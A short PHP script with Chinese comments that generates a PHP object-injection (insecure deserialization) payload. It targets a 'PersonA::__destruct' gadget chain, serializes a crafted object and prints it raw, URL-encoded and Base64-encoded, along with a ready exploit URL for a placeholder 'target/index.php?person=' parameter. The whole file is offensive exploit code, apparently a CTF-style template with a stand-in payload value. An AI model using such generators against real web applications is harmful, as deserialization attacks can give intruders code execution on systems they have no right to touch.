<?php
/**
 * POP Chain Exploit Payload
 * 链路: PersonA::__destruct
 */

// === 类定义 (复制目标的类结构) ===
class Person {
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person {
}

// === 构造利用链 ===

// 入口对象: PersonA
$exploit = new PersonA();
$exploit->age = "payload";  // 参数

// === 生成 Payload ===
$payload = serialize($exploit);
echo "Payload (raw):\n" . $payload . "\n\n";
echo "Payload (URL encoded):\n" . urlencode($payload) . "\n\n";
echo "Payload (Base64):\n" . base64_encode($payload) . "\n\n";

// === 完整利用 URL ===
echo "利用URL:\n" . "http://target/index.php?person=" . urlencode($payload) . "\n\n";
